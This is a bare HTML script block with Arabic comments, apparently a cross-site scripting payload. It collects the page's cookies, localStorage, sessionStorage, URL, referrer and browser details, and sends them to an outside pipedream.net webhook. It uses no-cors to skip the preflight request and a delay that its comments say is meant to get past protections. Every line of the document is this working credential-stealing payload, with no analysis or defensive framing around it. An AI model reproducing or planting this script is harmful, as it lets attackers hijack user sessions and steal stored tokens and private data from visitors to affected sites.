<script>
(async () => {
  // وظيفة تأخير لتجاوز بعض الحمايات
  await new Promise(r => setTimeout(r, 1000));

  // محاولة الوصول إلى DOM + التخزين + الكوكيز
  const data = {
    location: location.href,
    cookies: document.cookie,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage),
    userAgent: navigator.userAgent,
    referrer: document.referrer,
    platform: navigator.platform,
    screen: {
      width: screen.width,
      height: screen.height,
    },
    timestamp: new Date().toISOString()
  };

  // إرسال البيانات إلى Webhook
  fetch("https://eoat1elxcyeymir.m.pipedream.net", {
    method: "POST",
    mode: "no-cors", // لتخطي OPTIONS
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify(data)
  });
})();
</script>
